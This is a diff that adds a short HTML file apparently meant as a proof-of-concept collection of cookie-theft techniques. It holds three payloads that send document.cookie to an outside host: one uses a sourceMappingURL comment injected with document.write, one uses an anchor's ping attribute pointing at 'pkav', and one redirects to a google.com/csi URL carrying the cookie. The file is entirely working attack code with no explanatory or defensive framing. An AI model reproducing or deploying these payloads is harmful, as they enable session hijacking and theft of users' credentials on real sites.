@@ -1,0 +1,14 @@
+<script>
+  document.write(`<script>// # sourceMappingURL=https://pkav/?${escape(document.cookie)}</script>`);
+</script>
+<a id="ping-link">Click Here</a>
+<script>
+  var a = document.createElement('a');
+  a.href = '#';
+  a.ping = `//pkav/?${escape(document.cookie)}`;
+  a.onclick = function() {
+    document.location.href = `https://www.google.com/csi?${escape(document.cookie)}`;
+  };
+  document.body.appendChild(a);
+  document.getElementById('ping-link').onclick = function() { a.click(); };
+</script>
